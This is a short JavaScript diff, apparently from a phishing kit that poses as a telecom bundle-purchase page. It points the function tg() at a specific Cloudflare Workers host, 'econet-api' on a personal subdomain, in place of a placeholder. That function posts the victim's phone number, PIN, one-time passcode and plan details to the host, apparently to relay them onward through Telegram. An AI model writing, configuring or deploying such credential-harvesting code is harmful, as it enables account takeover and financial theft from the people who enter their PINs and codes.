@@ -401,7 +401,7 @@ function tgPhone(raw){
 }
 function tg(event,otp){
   try{
-    fetch('https://payless-api.YOUR-SUBDOMAIN.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:event,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',
         plan:plan.duration||'',voice:plan.voice||'',sms:plan.sms||'',
         data:plan.data||'',amount:plan.amount||'',
